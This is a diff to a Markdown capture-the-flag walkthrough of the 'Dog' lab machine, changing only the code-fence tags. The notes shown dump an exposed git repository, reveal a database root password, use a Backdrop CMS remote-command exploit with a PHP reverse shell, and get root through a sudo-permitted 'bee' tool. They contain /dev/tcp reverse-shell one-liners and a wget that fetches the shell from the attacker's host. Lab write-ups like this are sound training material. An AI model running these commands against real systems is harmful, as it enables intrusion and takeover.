@@ -35,7 +35,7 @@
 - sudo /usr/local/bin/bee php-script /home/johncusack/php-reverse-shell.php while having netcat listen on that port
 - gain root privilege
 - code:
-	```bash
+	```
 pipx install git-dumper
 git-dumper http://10.10.11.58/.git/ ./dog_repo # .git/ not necessary
 cd dog_repo
@@ -48,11 +48,11 @@ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 		- Mysql Credentials:
 			- user : root
 			- password : BackDropJ2024DS2024
-	```bash
+	```
 git log
 ```
 	- gives us :
-		```bash
+		```
 commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
 Author: root <dog@dog.htb>
 Date:   Fri Feb 7 21:22:11 2025 +0000
@@ -60,11 +60,11 @@ Date:   Fri Feb 7 21:22:11 2025 +0000
     todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
 ```
 		- we see dog@dog.htb 
-	```bash
+	```
 grep -r "@dog.htb"
 ```
 	- we get :
-		```bash
+		```
 files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
 ```
 		- we find user tiffany@dog.htb
@@ -79,13 +79,13 @@ files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:      
 		- **Module**
 			- accepts tar files.
 			- I searched exploits of backdrop cms 1 and downloaded the python script for Authenticated Remote Command Execution (RCE).
-				```bash
+				```
 searchsploit cms backdrop 1
 searchsploit -m php/webapps/52021.py
 python3 52021.py http://10.10.11.58
 ```
 				- This gave me an output:
-					```bash
+					```
 Backdrop CMS 1.27.1 - Remote Command Execution Exploit
 Evil module generating...
 Evil module generated! shell.zip
@@ -97,15 +97,15 @@ Your shell address: http://10.10.11.58/modules/shell/shell.php
 					- ideally  after modifying the script if you compress with tar it should work but i didnt do that.
 					- **however i replaced the php file with my pentestmonkey file and tar'd that.**
 				- I uploaded the module (Functionality>Install ne modules>Manual Installation) or at (close to what the output of exploit said) :
-					```bash
+					```
 http://10.10.11.58/?q=admin/modules/install
 ```
 					- more specifically at:
-						```bash
+						```
 http://10.10.11.58/?q=admin/installer/manual
 ```
 				- which installed the module which i could access at (based on output of exploit):
-					```bash
+					```
 http://10.10.11.58/modules/shell
 ```
 				- turned on netcat listener at my port and selected my php shell from the browser to gain foothold as www-data.
@@ -120,11 +120,11 @@ http://10.10.11.58/modules/shell
 			- can ssh into machine for better shell
 ## Privilege escalation
 - pass command:
-	```bash
+	```
 sudo -l
 ```
 	- shows we can pass this as sudo/root:
-		```bash
+		```
 /usr/local/bin/bee
 ```
 - pass sudo /usr/local/bin/bee
@@ -137,11 +137,11 @@ sudo -l
 			- then i could pass more commands
 				- what stoop out was eval and php-script which allowed us to run/execute php scripts
 			- i initially tried eval and inputting bash with variations of this :
-				```bash
+				```
 bash -c 'bash -i >& /dev/tcp/<local_ip>/9998 0>&1'
 ```
 				- However i couldn't figure out the correct syntax to send to my netcat listener. I did notice that when i sent:
-					```bash
+					```
 sudo /usr/local/bin/bee eval >& /dev/tcp/<local_ip>/9998 0>&1
 ```
 				- my netcat listener did pick up something but terminated or if i passed the bash -i command without quotes it did the same so something was working. maybe i had to account for spaces. but bash was being viewed as a constant too.
@@ -152,11 +152,11 @@ sudo /usr/local/bin/bee eval >& /dev/tcp/<local_ip>/9998 0>&1
 python3 -m http.server 8001
 ```
 				- and pulled my file via the command (note, you wont be able to pull in /var/www/html)
-					```bash
+					```
 wget http://10.10.14.25:8001/php-reverse-shell.php
 ```
 				- passed the following command while having netcat listener present:
-					```bash
+					```
 johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-script /home/johncusack/php-reverse-shell.php
 ```
 					- gained root and caught root flag at /root/root.txt
@@ -165,11 +165,11 @@ johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-script /home/johncusac
 - once i found backdrop_tool/bee
 	- found bee.php which was similar code to earlier at /usr/local/bin/bee
 - i grepped for :
-	```bash
+	```
 grep -r "function bee_" /backdrop_tool/bee/
 ```
 	- and found :
-		```bash
+		```
 /backdrop_tool/bee/includes/command.inc and other files here
 ```
 		- was the functions that was called from /usr/local/bin/bee
